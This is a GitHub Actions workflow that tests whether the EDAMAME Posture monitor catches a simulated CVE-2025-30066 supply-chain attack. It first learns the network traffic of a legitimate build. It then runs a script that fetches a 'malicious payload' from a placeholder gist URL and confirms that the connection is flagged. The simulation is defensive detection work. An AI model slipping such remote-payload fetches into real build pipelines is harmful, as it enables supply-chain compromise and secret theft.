name: CVE-2025-30066 detection demo
on: [workflow_dispatch]

jobs:
  demonstrate-cve-detection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Setup EDAMAME Posture
        run: |
          # Download and install EDAMAME Posture
          curl -LO https://github.com/edamametechnologies/edamame_posture_cli/releases/download/v0.9.21/edamame_posture-0.9.21-x86_64-unknown-linux-gnu
          chmod +x edamame_posture-0.9.21-x86_64-unknown-linux-gnu
          sudo mv edamame_posture-0.9.21-x86_64-unknown-linux-gnu /usr/local/bin/edamame_posture
          
          # Start EDAMAME in disconnected mode with LAN scanning and GitHub Linux whitelist
          sudo edamame_posture background-start-disconnected true github_linux

      - name: Create legitimate build script
        run: |
          # Create a simple Python script that represents a legitimate build process
          cat > build.py << EOF
          import subprocess
          import sys
          import requests

          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Download a legitimate dependency (from PyPI)
          print("Downloading requests library info from PyPI...")
          response = requests.get("https://pypi.org/pypi/requests/json")
          print(f"Downloaded PyPI info: {response.status_code}")
          
          # Run pip list (legitimate action)
          subprocess.run(["pip", "list"])
          
          print("Build completed successfully!")
          EOF

      - name: Run legitimate build process
        run: |
          # Install dependencies
          pip install requests
          
          # Run the build script
          python build.py

      - name: Create whitelist from legitimate traffic
        run: |
          # First, grab the sessions that occurred during our legitimate build
          sudo edamame_posture get-sessions
          
          # Create a custom whitelist from the observed network activity
          sudo edamame_posture create-custom-whitelists > whitelist.json
          
          # Display the whitelist for debugging
          cat whitelist.json
          
          # Apply the whitelist for future monitoring
          sudo edamame_posture set-custom-whitelists "$(cat whitelist.json)"

      - name: Create malicious build script (simulating CVE-2025-30066)
        run: |
          # Create a Python script that simulates the malicious behavior from CVE-2025-30066
          # This script will attempt to connect to gist.githubusercontent.com - mimicking the attack vector
          cat > build_malicious.py << EOF
          import subprocess
          import sys
          import requests
          import os
          
          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Simulate the attack vector - connect to gist.githubusercontent.com
          # This is similar to what the compromised tj-actions/changed-files action did
          print("Attempting to fetch malicious payload from gist.githubusercontent.com...")
          try:
              response = requests.get("https://gist.githubusercontent.com/example/123456/raw/malicious.py")
              print(f"Downloaded malicious payload: {response.status_code}")
          except Exception as e:
              print(f"Error downloading malicious payload: {e}")
          
          # Continue with legitimate-looking actions
          subprocess.run(["pip", "list"])
          
          print("Build completed!")
          EOF

      - name: Run build process with simulated malicious behavior
        run: |
          # Run the malicious build script
          python build_malicious.py

      - name: Check for whitelist violations (should detect the malicious connection)
        id: whitelist_check
        continue-on-error: true
        run: |
          # This should exit with non-zero code because the whitelist was violated
          sudo edamame_posture get-sessions
          echo "exit_code=$?" >> $GITHUB_OUTPUT

      - name: Verify detection
        run: |
          if [ "${{ steps.whitelist_check.outputs.exit_code }}" != "0" ]; then
            echo "✅ SUCCESS: EDAMAME detected unauthorized connection to gist.githubusercontent.com"
            echo "This demonstrates how EDAMAME would have detected CVE-2025-30066"
            echo "The tj-actions/changed-files attack used this exact pattern to exfiltrate secrets"
          else
            echo "❌ FAILURE: EDAMAME did not detect the unauthorized connection"
            exit 1
          fi

      - name: Generate detailed report of the violation
        run: |
          # Display all sessions for detailed analysis
          sudo edamame_posture get-sessions true

      - name: Clean up
        run: |
          # Stop EDAMAME background process
          sudo edamame_posture stop 